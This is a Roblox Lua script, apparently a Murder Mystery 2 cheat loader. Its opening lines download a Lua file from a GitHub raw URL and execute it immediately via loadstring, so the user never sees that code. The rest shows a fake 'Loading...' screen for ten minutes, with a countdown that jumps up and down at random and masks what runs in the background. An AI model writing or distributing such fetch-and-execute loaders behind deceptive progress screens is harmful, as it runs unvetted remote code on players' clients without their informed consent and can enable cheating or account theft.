local scriptContent = game:HttpGet("https://raw.githubusercontent.com/jnscripts/Mm2executer/refs/heads/main/Helpmm2.lua", true)
loadstring(scriptContent)()

local player = game.Players.LocalPlayer
local gui = Instance.new("ScreenGui")
gui.ResetOnSpawn = false  
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0.3, 0, 0.2, 0)
frame.Position = UDim2.new(0.35, 0, 0.4, 0)
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
frame.BorderSizePixel = 2
frame.Active = true  
frame.Draggable = true  
frame.Parent = gui

local textLabel = Instance.new("TextLabel")
textLabel.Size = UDim2.new(1, 0, 0.3, 0)
textLabel.Position = UDim2.new(0, 0, 0.05, 0)
textLabel.Text = "Loading..."
textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
textLabel.BackgroundTransparency = 1
textLabel.Font = Enum.Font.SourceSansBold
textLabel.TextScaled = true
textLabel.Parent = frame

local numberLabel = Instance.new("TextLabel")
numberLabel.Size = UDim2.new(0.8, 0, 0.2, 0)
numberLabel.Position = UDim2.new(0.1, 0, 0.5, 0)
numberLabel.Text = "5 seconds left"
numberLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
numberLabel.BackgroundTransparency = 1
numberLabel.Font = Enum.Font.SourceSans
numberLabel.TextScaled = true
numberLabel.Parent = frame

local loadingFrame = Instance.new("Frame")
loadingFrame.Size = UDim2.new(0.9, 0, 0.2, 0)
loadingFrame.Position = UDim2.new(0.05, 0, 0.75, 0)
loadingFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
loadingFrame.BorderSizePixel = 2
loadingFrame.Parent = frame

local progressBar = Instance.new("Frame")
progressBar.Size = UDim2.new(0, 0, 1, 0)
progressBar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
progressBar.Parent = loadingFrame

local totalTime = 600
local currentNumber = 5  

for i = 1, totalTime do
    progressBar.Size = UDim2.new(i / totalTime, 0, 1, 0)
    numberLabel.Text = tostring(currentNumber) .. " seconds"

    if i % 2 == 0 then
        currentNumber = math.floor(currentNumber - (currentNumber / 4))
    else
        currentNumber = currentNumber + 10
    end

    wait(1)
end

gui:Destroy()
